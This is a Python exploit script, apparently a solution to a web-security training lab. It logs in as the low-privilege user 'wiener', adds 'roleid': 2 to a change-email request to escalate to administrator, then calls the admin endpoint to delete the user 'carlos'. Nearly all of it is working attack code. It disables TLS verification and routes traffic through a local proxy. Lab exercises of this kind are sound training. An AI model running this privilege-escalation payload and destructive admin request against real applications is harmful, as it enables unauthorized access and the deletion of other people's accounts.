import requests
import sys
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxy = {'http': 'http://127.0.0.1:8080', "https": "http://127.0.0.1:8080"}


def delete_carlos(url, session):
    login_response = login(url, session)
    data = {"email": "test@test.com", "roleid": 2}
    update_email = session.post(url=url + "/my-account/change-email",
                                verify=False,
                                json=data,
                                proxies=proxy)
    if update_email.status_code == 200:
        print("[*] Email and role ID is updated successfully")
        print("[*] Trying to delete carlos's account")
        delete_carlos_response = session.get(url=url + "/admin/delete?username=carlos")
        if delete_carlos_response.status_code == 200 and "Admin interface only available if logged in as an administrator " not in delete_carlos_response.text:
            print("[*] Carlos's account has been deleted successfully")
            print("[*] Lab Solved !!")
        else:
            print("[*] Exploit Failed :((")

    else:
        print("[*] Exploit Failed :((")


def login(url, session, username="wiener", password="peter"):
    login_data = {"username": username.strip(), "password": password.strip()}
    login_url = url + "/login"
    login_response = session.post(url=login_url,
                                  data=login_data,
                                  proxies=proxy,
                                  verify=False,
                                  )
    if "Invalid username or password." not in login_response.text and login_response.status_code == 200:
        print("[*] Login successful")
        return login_response
    else:
        print("[*] Login Failed")
        print(login_response.status_code)
        return login_response



def main():
    if len(sys.argv) != 2:
        print("[*] Wrong tool Usage!")
        print(f"[*] Usage {sys.argv[0]} <url>")
        print(f"[*] Example {sys.argv[0]} https://example.com ")
        sys.exit(-1)
    else:
        session = requests.Session()

        delete_carlos(sys.argv[1], session)


if __name__ == "__main__":
    main()
